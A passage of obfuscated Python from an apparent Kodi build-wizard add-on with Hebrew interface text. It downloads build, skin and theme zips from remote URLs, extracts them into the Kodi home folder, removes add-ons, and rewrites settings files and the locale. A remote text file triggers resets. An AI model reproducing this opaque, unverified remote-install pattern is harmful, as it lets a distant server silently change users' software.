					O000O00OOO0000OO0 =os .path .join (PACKAGES ,O000OO0O0OO0O0000 )#line:4143
					try :os .remove (O000O00OOO0000OO0 )#line:4144
					except :pass #line:4145
					downloader .download (SKIN18ZIPURL +O000OO0O0OO0O0000 ,O000O00OOO0000OO0 ,DP )#line:4146
					extract .all (O000O00OOO0000OO0 ,HOME ,DP )#line:4147
					try :#line:4148
						OOOOO0OO00OOO0OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4149
						O0O0OO0O0OOOOO0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4150
						os .rename (OOOOO0OO00OOO0OOO ,O0O0OO0O0OOOOO0OO )#line:4151
					except :#line:4152
						pass #line:4153
					try :#line:4154
						O0OO00OO0O0O0O000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OOOO000OO000O0O0O =O0OO00OO0O0O0O000 .read ();O0OO00OO0O0O0O000 .close ()#line:4155
						OOOOOOO0OO0OO0OOO =wiz .parseDOM (OOOO000OO000O0O0O ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:4156
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOOO0OO0OO0OOO [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:4157
					except :#line:4158
						pass #line:4159
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:4160
					DP .close ()#line:4161
					xbmc .sleep (500 )#line:4162
					wiz .forceUpdate (True )#line:4163
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4164
				else :#line:4165
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4166
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OO000O0O0000O0O ,xbmc .LOGERROR )#line:4167
			else :#line:4168
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4169
		else :#line:4170
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4171
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4172
def skinfix17 ():#line:4173
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:4174
		O0OOOOOO0OO0O0OO0 =wiz .workingURL (SKINID17DDONXML )#line:4175
		if O0OOOOOO0OO0O0OO0 ==True :#line:4176
			O0O00000O00O00000 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:4177
			if len (O0O00000O00O00000 )>0 :#line:4178
				O00OOO0O0000000OO ='%s-%s.zip'%(SKINID17 ,O0O00000O00O00000 [0 ])#line:4179
				O0OOO0O0OO00OO0O0 =wiz .workingURL (SKIN17ZIPURL +O00OOO0O0000000OO )#line:4180
				if O0OOO0O0OO00OO0O0 ==True :#line:4181
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4182
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4183
					OOOOOOOOOOOO0OO0O =os .path .join (PACKAGES ,O00OOO0O0000000OO )#line:4184
					try :os .remove (OOOOOOOOOOOO0OO0O )#line:4185
					except :pass #line:4186
					downloader .download (SKIN17ZIPURL +O00OOO0O0000000OO ,OOOOOOOOOOOO0OO0O ,DP )#line:4187
					extract .all (OOOOOOOOOOOO0OO0O ,HOME ,DP )#line:4188
					try :#line:4189
						O0000OO0OO00OO0OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4190
						OO0O00O0000O0000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4191
						os .rename (O0000OO0OO00OO0OO ,OO0O00O0000O0000O )#line:4192
					except :#line:4193
						pass #line:4194
					try :#line:4195
						O0OO0O0OOO000O0O0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0OOOOO00O000000O =O0OO0O0OOO000O0O0 .read ();O0OO0O0OOO000O0O0 .close ()#line:4196
						OOOO0OOO0OOOOO00O =wiz .parseDOM (O0OOOOO00O000000O ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:4197
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0OOO0OOOOO00O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:4198
					except :#line:4199
						pass #line:4200
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:4201
					DP .close ()#line:4202
					xbmc .sleep (500 )#line:4203
					wiz .forceUpdate (True )#line:4204
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4205
				else :#line:4206
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4207
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OOO0O0OO00OO0O0 ,xbmc .LOGERROR )#line:4208
			else :#line:4209
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4210
		else :#line:4211
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4212
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4213
def fix17update ():#line:4214
	if KODIV >=17 and KODIV <18 :#line:4215
		wiz .kodi17Fix ()#line:4216
		xbmc .sleep (4000 )#line:4217
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4218
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4219
		fixfont ()#line:4220
		OOO00O000OO0000O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4221
		try :#line:4223
			O0O00000O000OOOOO =open (OOO00O000OO0000O0 ,'r')#line:4224
			O00O000000O0000OO =O0O00000O000OOOOO .read ()#line:4225
			O0O00000O000OOOOO .close ()#line:4226
			OO0000OO0O0000OO0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:4227
			O0O00O0000O0OO0O0 =re .compile (OO0000OO0O0000OO0 ).findall (O00O000000O0000OO )[0 ]#line:4228
			O0O00000O000OOOOO =open (OOO00O000OO0000O0 ,'w')#line:4229
			O0O00000O000OOOOO .write (O00O000000O0000OO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0O00O0000O0OO0O0 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:4230
			O0O00000O000OOOOO .close ()#line:4231
		except :#line:4232
				pass #line:4233
		wiz .kodi17Fix ()#line:4234
		OOO00O000OO0000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4235
		try :#line:4236
			O0O00000O000OOOOO =open (OOO00O000OO0000O0 ,'r')#line:4237
			O00O000000O0000OO =O0O00000O000OOOOO .read ()#line:4238
			O0O00000O000OOOOO .close ()#line:4239
			OO0000OO0O0000OO0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:4240
			O0O00O0000O0OO0O0 =re .compile (OO0000OO0O0000OO0 ).findall (O00O000000O0000OO )[0 ]#line:4241
			O0O00000O000OOOOO =open (OOO00O000OO0000O0 ,'w')#line:4242
			O0O00000O000OOOOO .write (O00O000000O0000OO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0O00O0000O0OO0O0 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:4243
			O0O00000O000OOOOO .close ()#line:4244
		except :#line:4245
				pass #line:4246
		swapSkins ('skin.Premium.mod')#line:4247
def fix18update ():#line:4249
	if KODIV >=18 :#line:4250
		xbmc .sleep (4000 )#line:4251
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4252
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4253
		fixfont ()#line:4254
		O0OOO00O000OOOOO0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4255
		try :#line:4256
			OO00OOOOOO00O000O =open (O0OOO00O000OOOOO0 ,'r')#line:4257
			OOOO0OO0OO0O0O0O0 =OO00OOOOOO00O000O .read ()#line:4258
			OO00OOOOOO00O000O .close ()#line:4259
			O0OO00O0O000000O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:4260
			O0OOO0000000OO000 =re .compile (O0OO00O0O000000O0 ).findall (OOOO0OO0OO0O0O0O0 )[0 ]#line:4261
			OO00OOOOOO00O000O =open (O0OOO00O000OOOOO0 ,'w')#line:4262
			OO00OOOOOO00O000O .write (OOOO0OO0OO0O0O0O0 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O0OOO0000000OO000 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:4263
			OO00OOOOOO00O000O .close ()#line:4264
		except :#line:4265
				pass #line:4266
		wiz .kodi17Fix ()#line:4267
		O0OOO00O000OOOOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4268
		try :#line:4269
			OO00OOOOOO00O000O =open (O0OOO00O000OOOOO0 ,'r')#line:4270
			OOOO0OO0OO0O0O0O0 =OO00OOOOOO00O000O .read ()#line:4271
			OO00OOOOOO00O000O .close ()#line:4272
			O0OO00O0O000000O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:4273
			O0OOO0000000OO000 =re .compile (O0OO00O0O000000O0 ).findall (OOOO0OO0OO0O0O0O0 )[0 ]#line:4274
			OO00OOOOOO00O000O =open (O0OOO00O000OOOOO0 ,'w')#line:4275
			OO00OOOOOO00O000O .write (OOOO0OO0OO0O0O0O0 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O0OOO0000000OO000 ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:4276
			OO00OOOOOO00O000O .close ()#line:4277
		except :#line:4278
				pass #line:4279
		swapSkins ('skin.Premium.mod')#line:4280
def buildWizard (OO0OO0O0000O0O0OO ,O0O0OOO00OOOO0OO0 ,theme =None ,over =False ):#line:4283
	O00000OO0OO0OO0O0 =xbmcgui .DialogBusy ()#line:4284
	O00000OO0OO0OO0O0 .create ()#line:4285
	if over ==False :#line:4286
		OOOOOOOO00OOO0OOO =wiz .checkBuild (OO0OO0O0000O0O0OO ,'url')#line:4287
		if USERNAME =='':#line:4288
			ADDON .openSettings ()#line:4289
			sys .exit ()#line:4290
		if PASSWORD =='':#line:4291
			ADDON .openSettings ()#line:4292
			sys .exit ()#line:4293
		if BUILDNAME =='':#line:4295
			OO00OO0OO0O0O00O0 =u_list (SPEEDFILE )#line:4296
			(OO00OO0OO0O0O00O0 )#line:4297
		if OOOOOOOO00OOO0OOO ==False :#line:4298
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:4303
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:4304
			return #line:4305
		O0O0OOO000OOOO00O =wiz .workingURL (OOOOOOOO00OOO0OOO )#line:4306
		if O0O0OOO000OOOO00O ==False :#line:4307
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0O0OOO000OOOO00O ))#line:4308
			return #line:4309
	if O0O0OOO00OOOO0OO0 =='gui':#line:4310
		if OO0OO0O0000O0O0OO ==BUILDNAME :#line:4311
			if over ==True :OO000O0OO0OOO0O0O =1 #line:4312
			else :OO000O0OO0OOO0O0O =1 #line:4313
		else :#line:4314
			OO000O0OO0OOO0O0O =1 #line:4315
		if OO000O0OO0OOO0O0O :#line:4316
			remove_addons ()#line:4317
			remove_addons2 ()#line:4318
			debridit .debridIt ('update','all')#line:4319
			traktit .traktIt ('update','all')#line:4320
			O0OO0O0000O000OOO =wiz .checkBuild (OO0OO0O0000O0O0OO ,'gui')#line:4321
			OOOOOO0OOOOO00000 =OO0OO0O0000O0O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4322
			if not wiz .workingURL (O0OO0O0000O000OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4323
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4324
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0000O0O0OO ),'','אנא המתן')#line:4325
			OOO0O000O000O0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOO0OOOOO00000 )#line:4326
			try :os .remove (OOO0O000O000O0O00 )#line:4327
			except :pass #line:4328
			logging .warning (O0OO0O0000O000OOO )#line:4329
			if 'google'in O0OO0O0000O000OOO :#line:4330
			   O0000O0O00000O00O =googledrive_download (O0OO0O0000O000OOO ,OOO0O000O000O0O00 ,DP ,wiz .checkBuild (OO0OO0O0000O0O0OO ,'filesize'))#line:4331
			else :#line:4334
			  downloader .download (O0OO0O0000O000OOO ,OOO0O000O000O0O00 ,DP )#line:4335
			xbmc .sleep (100 )#line:4336
			O000000OO0O00000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0000O0O0OO )#line:4337
			DP .update (0 ,O000000OO0O00000O ,'','אנא המתן')#line:4338
			extract .all (OOO0O000O000O0O00 ,HOME ,DP ,title =O000000OO0O00000O )#line:4339
			DP .close ()#line:4340
			wiz .defaultSkin ()#line:4341
			wiz .lookandFeelData ('save')#line:4342
			try :#line:4343
				telemedia_android5fix ()#line:4344
			except :pass #line:4345
			wiz .kodi17Fix ()#line:4346
			if KODIV >=18 :#line:4347
				skindialogsettind18 ()#line:4348
			debridit .debridIt ('restore','all')#line:4349
			traktit .traktIt ('restore','all')#line:4350
			if INSTALLMETHOD ==1 :O00OOOOOO00OOOO00 =1 #line:4352
			elif INSTALLMETHOD ==2 :O00OOOOOO00OOOO00 =0 #line:4353
			else :DP .close ()#line:4354
			OOO0OOO0OO0OO00O0 =(NOTIFICATION2 )#line:4355
			O000OOOOOO0O00OO0 =urllib2 .urlopen (OOO0OOO0OO0OO00O0 )#line:4356
			O00000OO00000OOOO =O000OOOOOO0O00OO0 .readlines ()#line:4357
			OOOOOO0000000O00O =0 #line:4358
			for O0OO00000000O000O in O00000OO00000OOOO :#line:4361
				if O0OO00000000O000O .split (' ==')[0 ]=="noreset"or O0OO00000000O000O .split ()[0 ]=="noreset":#line:4362
					xbmc .executebuiltin ("ReloadSkin()")#line:4364
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:4365
					update_Votes ()#line:4366
					indicatorfastupdate ()#line:4367
				if O0OO00000000O000O .split (' ==')[0 ]=="reset"or O0OO00000000O000O .split ()[0 ]=="reset":#line:4368
					update_Votes ()#line:4370
					indicatorfastupdate ()#line:4371
					resetkodi ()#line:4372
		else :#line:4381
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4382
	if O0O0OOO00OOOO0OO0 =='gui2':#line:4383
		if OO0OO0O0000O0O0OO ==BUILDNAME :#line:4384
			if over ==True :OO000O0OO0OOO0O0O =1 #line:4385
			else :OO000O0OO0OOO0O0O =1 #line:4386
		else :#line:4387
			OO000O0OO0OOO0O0O =1 #line:4388
		if OO000O0OO0OOO0O0O :#line:4389
			remove_addons ()#line:4390
			remove_addons2 ()#line:4391
			O0OO0O0000O000OOO =wiz .checkBuild (OO0OO0O0000O0O0OO ,'gui')#line:4392
			OOOOOO0OOOOO00000 =OO0OO0O0000O0O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4393
			if not wiz .workingURL (O0OO0O0000O000OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4394
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4395
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0000O0O0OO ),'','אנא המתן')#line:4396
			OOO0O000O000O0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOO0OOOOO00000 )#line:4397
			try :os .remove (OOO0O000O000O0O00 )#line:4398
			except :pass #line:4399
			logging .warning (O0OO0O0000O000OOO )#line:4400
			if 'google'in O0OO0O0000O000OOO :#line:4401
			   O0000O0O00000O00O =googledrive_download (O0OO0O0000O000OOO ,OOO0O000O000O0O00 ,DP ,wiz .checkBuild (OO0OO0O0000O0O0OO ,'filesize'))#line:4402
			else :#line:4405
			  downloader .download (O0OO0O0000O000OOO ,OOO0O000O000O0O00 ,DP )#line:4406
			xbmc .sleep (100 )#line:4407
			O000000OO0O00000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0000O0O0OO )#line:4408
			DP .update (0 ,O000000OO0O00000O ,'','אנא המתן')#line:4409
			extract .all (OOO0O000O000O0O00 ,HOME ,DP ,title =O000000OO0O00000O )#line:4410
			DP .close ()#line:4411
			wiz .defaultSkin ()#line:4412
			wiz .lookandFeelData ('save')#line:4413
			if INSTALLMETHOD ==1 :O00OOOOOO00OOOO00 =1 #line:4416
			elif INSTALLMETHOD ==2 :O00OOOOOO00OOOO00 =0 #line:4417
			else :DP .close ()#line:4418
		else :#line:4420
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4421
	elif O0O0OOO00OOOO0OO0 =='fresh':#line:4422
		freshStart (OO0OO0O0000O0O0OO )#line:4423
	elif O0O0OOO00OOOO0OO0 =='normal':#line:4424
		if url =='normal':#line:4425
			if KEEPTRAKT =='true':#line:4426
				traktit .autoUpdate ('all')#line:4427
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4428
			if KEEPREAL =='true':#line:4429
				debridit .autoUpdate ('all')#line:4430
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4431
			if KEEPLOGIN =='true':#line:4432
				loginit .autoUpdate ('all')#line:4433
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4434
		OO00O0OOO0OO0OOOO =int (KODIV );O0O0O000O0OO0000O =int (float (wiz .checkBuild (OO0OO0O0000O0O0OO ,'kodi')))#line:4435
		if not OO00O0OOO0OO0OOOO ==O0O0O000O0OO0000O :#line:4436
			if OO00O0OOO0OO0OOOO ==16 and O0O0O000O0OO0000O <=15 :OOO00000OOO00O000 =False #line:4437
			else :OOO00000OOO00O000 =True #line:4438
		else :OOO00000OOO00O000 =False #line:4439
		if OOO00000OOO00O000 ==True :#line:4440
			O0OOOO0O0OOOO0O00 =1 #line:4441
		else :#line:4442
			if not over ==False :O0OOOO0O0OOOO0O00 =1 #line:4443
			else :O0OOOO0O0OOOO0O00 =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4444
		if O0OOOO0O0OOOO0O00 :#line:4445
			wiz .clearS ('build')#line:4446
			O0OO0O0000O000OOO =wiz .checkBuild (OO0OO0O0000O0O0OO ,'url')#line:4447
			OOOOOO0OOOOO00000 =OO0OO0O0000O0O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4448
			if not wiz .workingURL (O0OO0O0000O000OOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4449
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4450
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OO0OO0O0000O0O0OO ,wiz .checkBuild (OO0OO0O0000O0O0OO ,'version')),'','אנא המתן')#line:4451
			OOO0O000O000O0O00 =os .path .join (PACKAGES ,'%s.zip'%OOOOOO0OOOOO00000 )#line:4452
			try :os .remove (OOO0O000O000O0O00 )#line:4453
			except :pass #line:4454
			logging .warning (O0OO0O0000O000OOO )#line:4455
			if 'google'in O0OO0O0000O000OOO :#line:4456
			   O0000O0O00000O00O =googledrive_download (O0OO0O0000O000OOO ,OOO0O000O000O0O00 ,DP ,wiz .checkBuild (OO0OO0O0000O0O0OO ,'filesize'))#line:4457
			else :#line:4460
			  downloader .download (O0OO0O0000O000OOO ,OOO0O000O000O0O00 ,DP )#line:4461
			xbmc .sleep (1000 )#line:4462
			O000000OO0O00000O ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0000O0O0OO ,wiz .checkBuild (OO0OO0O0000O0O0OO ,'version'))#line:4463
			DP .update (0 ,O000000OO0O00000O ,'','אנא המתן...')#line:4464
			OO00O0O00OO00O000 ,O000O0000O0O000O0 ,O000000OOOOOOOOOO =extract .all (OOO0O000O000O0O00 ,HOME ,DP ,title =O000000OO0O00000O )#line:4465
			if int (float (OO00O0O00OO00O000 ))>0 :#line:4466
				try :#line:4467
					wiz .fixmetas ()#line:4468
				except :pass #line:4469
				wiz .lookandFeelData ('save')#line:4470
				wiz .defaultSkin ()#line:4471
				wiz .setS ('buildname',OO0OO0O0000O0O0OO )#line:4473
				wiz .setS ('buildversion',wiz .checkBuild (OO0OO0O0000O0O0OO ,'version'))#line:4474
				wiz .setS ('buildtheme','')#line:4475
				wiz .setS ('latestversion',wiz .checkBuild (OO0OO0O0000O0O0OO ,'version'))#line:4476
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4477
				wiz .setS ('installed','true')#line:4478
				wiz .setS ('extract',str (OO00O0O00OO00O000 ))#line:4479
				wiz .setS ('errors',str (O000O0000O0O000O0 ))#line:4480
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO00O0O00OO00O000 ,O000O0000O0O000O0 ))#line:4481
				fastupdatefirstbuild (NOTEID )#line:4482
				try :#line:4483
					telemedia_android5fix ()#line:4484
				except :pass #line:4485
				wiz .kodi17Fix ()#line:4486
				skin_homeselect ()#line:4487
				kodi17to18 ()#line:4493
				try :os .remove (OOO0O000O000O0O00 )#line:4495
				except :pass #line:4496
				DP .close ()#line:4516
				O00OOOO0O00OOO0O0 =wiz .themeCount (OO0OO0O0000O0O0OO )#line:4517
				builde_Votes ()#line:4518
				indicator ()#line:4519
				if not O00OOOO0O00OOO0O0 ==False :#line:4520
					buildWizard (OO0OO0O0000O0O0OO ,'theme')#line:4521
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4522
				if INSTALLMETHOD ==1 :O00OOOOOO00OOOO00 =1 #line:4523
				elif INSTALLMETHOD ==2 :O00OOOOOO00OOOO00 =0 #line:4524
				else :resetkodi ()#line:4525
				if O00OOOOOO00OOOO00 ==1 :wiz .reloadFix ()#line:4527
				else :wiz .killxbmc (True )#line:4528
			else :#line:4529
				if isinstance (O000O0000O0O000O0 ,unicode ):#line:4530
					O000000OOOOOOOOOO =O000000OOOOOOOOOO .encode ('utf-8')#line:4531
				OOO0O0OO0O0OOO000 =open (OOO0O000O000O0O00 ,'r')#line:4532
				O0O0O000OO00OOOOO =OOO0O0OO0O0OOO000 .read ()#line:4533
				OOOOOOOO0000OO0OO =''#line:4534
				for OOO0OOO0000OOO0O0 in O0000O0O00000O00O :#line:4535
				  OOOOOOOO0000OO0OO ='key: '+OOOOOOOO0000OO0OO +'\n'+OOO0OOO0000OOO0O0 #line:4536
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O000000OOOOOOOOOO +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+OOOOOOOO0000OO0OO )#line:4537
		else :#line:4538
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4539
	elif O0O0OOO00OOOO0OO0 =='theme':#line:4540
		if theme ==None :#line:4541
			O00OOOO0O00OOO0O0 =wiz .checkBuild (OO0OO0O0000O0O0OO ,'theme')#line:4542
			OOOO0O0000OOO0OOO =[]#line:4543
			if not O00OOOO0O00OOO0O0 =='http://'and wiz .workingURL (O00OOOO0O00OOO0O0 )==True :#line:4544
				OOOO0O0000OOO0OOO =wiz .themeCount (OO0OO0O0000O0O0OO ,False )#line:4545
				if len (OOOO0O0000OOO0OOO )>0 :#line:4546
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OO0OO0O0000O0O0OO ,COLOR1 ,len (OOOO0O0000OOO0OOO )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4547
						wiz .log ("Theme List: %s "%str (OOOO0O0000OOO0OOO ))#line:4548
						OO000O0O0O000O0O0 =DIALOG .select (ADDONTITLE ,OOOO0O0000OOO0OOO )#line:4549
						wiz .log ("Theme install selected: %s"%OO000O0O0O000O0O0 )#line:4550
						if not OO000O0O0O000O0O0 ==-1 :theme =OOOO0O0000OOO0OOO [OO000O0O0O000O0O0 ];OO0OO00OO0OOO0OOO =True #line:4551
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4552
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4553
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4554
		else :OO0OO00OO0OOO0OOO =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OO0OO0O0000O0O0OO ,wiz .checkBuild (OO0OO0O0000O0O0OO ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4555
		if OO0OO00OO0OOO0OOO :#line:4556
			O0OOO0000000O0O00 =wiz .checkTheme (OO0OO0O0000O0O0OO ,theme ,'url')#line:4557
			OOOOOO0OOOOO00000 =OO0OO0O0000O0O0OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4558
			if not wiz .workingURL (O0OOO0000000O0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4559
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4560
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4561
			OOO0O000O000O0O00 =os .path .join (PACKAGES ,'%s.zip'%OOOOOO0OOOOO00000 )#line:4562
			try :os .remove (OOO0O000O000O0O00 )#line:4563
			except :pass #line:4564
			downloader .download (O0OOO0000000O0O00 ,OOO0O000O000O0O00 ,DP )#line:4565
			xbmc .sleep (1000 )#line:4566
			DP .update (0 ,"","Installing %s "%OO0OO0O0000O0O0OO )#line:4567
			OO00OOOOOO0O00O00 =False #line:4568
